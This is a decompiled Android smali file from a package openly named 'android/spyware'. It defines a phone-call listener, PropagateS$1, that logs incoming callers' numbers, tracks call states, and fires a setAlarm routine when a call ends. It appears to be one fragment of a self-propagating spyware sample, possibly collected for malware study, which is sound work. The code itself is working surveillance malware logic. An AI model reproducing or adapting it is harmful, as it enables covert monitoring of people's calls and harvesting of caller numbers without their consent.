.class Landroid/spyware/PropagateS$1;
.super Landroid/telephony/PhoneStateListener;
.source "PropagateS.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Landroid/spyware/PropagateS;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Landroid/spyware/PropagateS;


# direct methods
.method constructor <init>(Landroid/spyware/PropagateS;)V
    .registers 2
    .param p1, "this$0"    # Landroid/spyware/PropagateS;

    .prologue
    .line 39
    iput-object p1, p0, Landroid/spyware/PropagateS$1;->this$0:Landroid/spyware/PropagateS;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public onCallStateChanged(ILjava/lang/String;)V
    .registers 6
    .param p1, "state"    # I
    .param p2, "incomingNumber"    # Ljava/lang/String;

    .prologue
    .line 42
    packed-switch p1, :pswitch_data_54

    .line 65
    :cond_3
    :goto_3
    return-void

    .line 44
    :pswitch_4
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "::DEB  Incoming call from "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 45
    # setter for: Landroid/spyware/PropagateS;->prevState:I
    invoke-static {p1}, Landroid/spyware/PropagateS;->access$002(I)I

    goto :goto_3

    .line 49
    :pswitch_20
    const-string v0, "::trace"

    const-string v1, "::DEB  On the call..."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 50
    # setter for: Landroid/spyware/PropagateS;->prevState:I
    invoke-static {p1}, Landroid/spyware/PropagateS;->access$002(I)I

    goto :goto_3

    .line 54
    :pswitch_2b
    # getter for: Landroid/spyware/PropagateS;->prevState:I
    invoke-static {}, Landroid/spyware/PropagateS;->access$000()I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_42

    .line 55
    const-string v0, "::trace"

    const-string v1, "::DEB  Call just ended."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 56
    # setter for: Landroid/spyware/PropagateS;->prevState:I
    invoke-static {p1}, Landroid/spyware/PropagateS;->access$002(I)I

    .line 57
    iget-object v0, p0, Landroid/spyware/PropagateS$1;->this$0:Landroid/spyware/PropagateS;

    # invokes: Landroid/spyware/PropagateS;->setAlarm()V
    invoke-static {v0}, Landroid/spyware/PropagateS;->access$100(Landroid/spyware/PropagateS;)V

    goto :goto_3

    .line 58
    :cond_42
    # getter for: Landroid/spyware/PropagateS;->prevState:I
    invoke-static {}, Landroid/spyware/PropagateS;->access$000()I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_3

    .line 59
    const-string v0, "::trace"

    const-string v1, "::DEB  Call missed or rejected."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    # setter for: Landroid/spyware/PropagateS;->prevState:I
    invoke-static {p1}, Landroid/spyware/PropagateS;->access$002(I)I

    goto :goto_3

    .line 42
    :pswitch_data_54
    .packed-switch 0x0
        :pswitch_2b
        :pswitch_4
        :pswitch_20
    .end packed-switch
.end method
